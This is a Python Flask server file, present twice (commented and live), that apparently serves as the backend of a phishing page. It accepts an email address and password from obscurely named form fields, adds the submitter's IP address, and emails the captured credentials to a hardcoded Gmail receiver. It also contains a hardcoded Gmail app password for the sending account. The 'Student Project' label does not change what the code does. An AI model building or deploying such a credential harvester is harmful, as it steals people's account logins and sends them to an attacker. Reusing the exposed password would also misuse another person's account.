# from flask import Flask, request, jsonify
# from flask_cors import CORS
# import smtplib
# from email.message import EmailMessage

# app = Flask(__name__)
# CORS(app)  # Allow requests from your frontend



# # Configuration
# EMAIL_SENDER = 'nwekee125@gmail.com'
# EMAIL_PASSWORD = 'wkxefsuonoulinca'  # Use a Gmail app password, not your real password
# EMAIL_RECEIVER = 'maxwell202201@gmail.com'


# @app.route('/submit', methods=['POST'])
# def submit():
#     email = request.form.get('x1')  # This is the email from the frontend
#     password = request.form.get('x2')
#     ip_address = request.remote_addr

#     # Compose email
#     msg = EmailMessage()
#     msg['Subject'] = 'New Form Submission (Student Project)'
#     msg['From'] = EMAIL_SENDER
#     msg['To'] = EMAIL_RECEIVER
#     msg.set_content(f"""
#     Email: {email}
#     Password: {password}
#     IP Address: {ip_address}
#     """)

#     # Send email
#     try:
#         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
#             smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
#             smtp.send_message(msg)
#         return jsonify({'status': 'success'})
#     except Exception as e:
#         return jsonify({'status': 'error', 'message': str(e)}), 500


# if __name__ == '__main__':
#     app.run(debug=True)
import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import smtplib
from email.message import EmailMessage

app = Flask(__name__)
CORS(app)

# Configuration
EMAIL_SENDER = 'nwekee125@gmail.com'
EMAIL_PASSWORD = 'wkxefsuonoulinca'  # Use a Gmail app password
EMAIL_RECEIVER = 'maxwell202201@gmail.com'

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('x1')
    password = request.form.get('x2')
    ip_address = request.remote_addr

    # Compose the email
    msg = EmailMessage()
    msg['Subject'] = 'New Form Submission (Student Project)'
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg.set_content(f"""
    Email: {email}
    Password: {password}
    IP Address: {ip_address}
    """)

    # Send the email
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)